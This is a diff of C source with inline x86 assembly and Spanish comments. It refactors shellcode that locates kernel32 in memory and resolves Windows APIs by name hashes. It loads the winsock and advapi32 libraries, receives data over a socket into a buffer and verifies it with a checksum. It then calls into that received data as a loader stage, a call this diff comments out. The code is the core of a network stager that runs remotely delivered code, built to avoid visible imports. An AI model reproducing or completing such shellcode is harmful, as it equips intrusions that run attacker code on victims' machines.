@@ -9,7 +9,7 @@
 #include <Windows.h>
 #include "macros.h"
 
-void LoadFunctions(DWORD lpHashes, DWORD numHashes);
+void LoadFunctions(DWORD numHashes);
 
 /*###############################################################################
 ** Identificadores para APIs y variables:
@@ -90,7 +90,7 @@ gtfo:
         jne  conti
         call [ebp+_ExitProcess]
 conti:
-        ret 0x4
+        ret
 #endif
 start:
 #ifdef SC_DELTA
@@ -156,46 +156,43 @@ next_module:
         jmp  next_module
 find_kernel32_finished:
 
-        movr(esi, LoadFunctions)
+        movr(ecx, LoadFunctions)
+        movr(esi,kernel32_symbol_hashes)//v Puntero al primer hash
 
         //Cargamos las apis de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
-        pushr(kernel32_symbol_hashes)   //v Puntero al primer hash de kernel32
-        //EAX = kernel32 BaseAddress
-        call esi                        //>LoadFunctions([&kernel32,] &kernel32_symbol_hashes, kernel32_count);
-
+        call ecx                        //>LoadFunctions(kernel32_count);
         mov  ebx, [ebp+_LoadLibraryA-(kernel32_count*4)]//EBX = &LoadLibraryA
 
+        push ecx
         //Obtenemos la BaseAddress de ws2_32
         pushc('23')                     //v
         pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
         push esp                        //v
         call ebx                        //>LoadLibraryA("ws2_32");
+        add  esp, 0x8                   //Restauramos la pila sacando la cadena ANSI
+        pop  ecx
 
         //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
-        add  esp, 0x8                   //Restauramos la pila sacando la cadena ANSI
         push ws2_32_count               //v Número de hashes de ws2_32
-        pushr(ws2_32_symbol_hashes)     //v Puntero al primer hash de ws2_32.dll
-        //eax = ws_32 BaseAddress
-        call esi                        //>LoadFunctions([&ws2_32,] &ws2_32_symbol_hashes, ws2_32_count);
+        call ecx                        //>LoadFunctions(ws2_32_count);
 
         //Obtenemos el BaseAddress de advapi32
         cdq                             //EDX = 0
+        push ecx
         push edx                        //v
         pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
         pushc('avda')                   //v
         push esp                        //v
         call ebx                        //>LoadLibraryA("advapi32");
         add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
+        pop  ecx
 
         push advapi32_count             //v Número de hashes de advapi32
-        pushr(advapi32_symbol_hashes)   //v Puntero al primer hash de advapi32
-        //eax = advapi32 BaseAddress
-        call esi                        //>LoadFunctions([&advapi32,] &advapi32_symbol_hashes, advapi32_count);
+        call ecx                        //>LoadFunctions(advapi32_count);
 
-        //Volvemos a apuntar el stack de APIs al inicio
+        //Volvemos a apuntar al inicio del stack de APIs
         sub  ebp, (kernel32_count + ws2_32_count + advapi32_count)*4
-
 
         //Creamos el buffer donde recibiremos toda la información
         #define BUFF_SIZE   0x10000
@@ -377,25 +374,24 @@ init_decrypt:
 
         mov  edx, [esi-4]               //hash = offset_basis
 FNV1a:
-        xor  eax, eax                   //v
         lodsb                           //al = str[i]; i++;
-        xor  edx, eax                   //>hash ^= str[i];
+        xor  dl, al                     //>hash ^= str[i];
         imul edx, 0x1EF30EB             //>hash *= 0x1EF30EB;
         loop FNV1a                      //>(len--);(len < 0)?
 
         test edx, edx
-        jz   NoErr4                     //>(EDX==0?)Si es igual a cero significa que los datos recibidos eran correctos
+        jnz  KillSocket                 //>(EDX==0?)Si es igual a cero significa que los datos recibidos eran correctos
 
-        //Algo falla en el checksum... reseteemos la conexión
-        jmp  KillSocket
+        //Si el checksum no devuelve 0 algo falla en el checksum... reseteemos la conexión
 
-NoErr4: //pushr(HASH)                   //v
+        //AUN POR DETERMINAR
+NoErr4: /*pushr(HASH)                   //v
         push [ebp+_hSocket]             //v
         push [ebp+_GetProcAddress]      //v
         push [ebp+_LoadLibraryA]        //v
         mov  eax, [ebp+_pBuff]          //v
         add  eax, 0x4                   //v
-        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &HASH);
+        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &HASH);*/
     }
 }
 
@@ -404,14 +400,14 @@ NoErr4: //pushr(HASH)                   //v
 **  Método encargado de rellenar el stack de direcciones.
 **  Llama a la función FindFunction() por cada hash en la lista
 **  almacenando la dirección en su respectiva posicion del stack.
-**  RECIBE BASEADDRESS EN EAX y el puntero  a HASHES en ESI
+**  RECIBE BASEADDRESS EN EAX y el puntero a HASHES en ESI
 *###############################################################################*/
-void __declspec(naked) LoadFunctions(DWORD lpHashes, DWORD numHashes){
+void __declspec(naked) LoadFunctions(DWORD numHashes){
     __asm{
-        pushad
-        lea  esi, [esp+0x24]            //ESI = &&lpHashes
-        mov  ecx, [esi+0x4]             //ECX = numHashes
-        mov  esi, [esi]                 //ESI = &lpHashes
+        push edi
+        push ecx
+        mov  ecx, [esp+0xC]             //ECX = numHashes
+        //ESI = &lpHashes
         mov  edx, eax                   //EDX = &IMAGE_DOS_HEADER
         lea  edi, [ebp+4]
 
@@ -437,14 +433,7 @@ find_function:
         #endif
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
 find_function_loop:
-        jecxz find_function_finished    //Si ECX == 0 ya no quedan funciones por recorrer
-        dec  ecx                        //ECX--
-        #ifdef SC_NULL
-        mov  esi, [ebp+ecx*4-1]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
-        dec  esi
-        #else
-        mov  esi, [ebp+ecx*4]
-        #endif
+        mov  esi, [ebp+ecx*4-4]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
         add  esi, edx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
 compute_hash:
         xor  ebx, ebx                   //EBX = 0
@@ -459,10 +448,9 @@ compute_hash_again:
         xor  ebx, eax                   //>hash ^= (char[i]*char[i])
         jmp  compute_hash_again
 compute_hash_finished:
-find_function_compare:
         pop  eax
         cmp  bx, ax                     //v
-        jnz  find_function_loop         //>(BX == FunctionHash)?
+        loopne find_function_loop       //>(BX == FunctionHash)&(ECX>0)?
         mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
         #ifdef SC_NULL
@@ -483,14 +471,14 @@ find_function_compare:
 find_function_finished:
         mov  [esp+0x1C], eax
         popad
-#pragma endregion EAX=HASH;EBX=BaseAddr
+#pragma endregion AX=HASH;EDX=BaseAddr
 
         //Guardamos dir en buffer pila
-        stosd                           //mov [edi], eax; edi+=4
+        stosd
         loop nextFunction               //(ECX--);(ECX!=0)?
-        sub  edi, 4
-        mov  [esp+0x8], edi
-        popad
+        lea  ebp, [edi-4]
+        pop  ecx
+        pop  edi
         ret
     }
 }
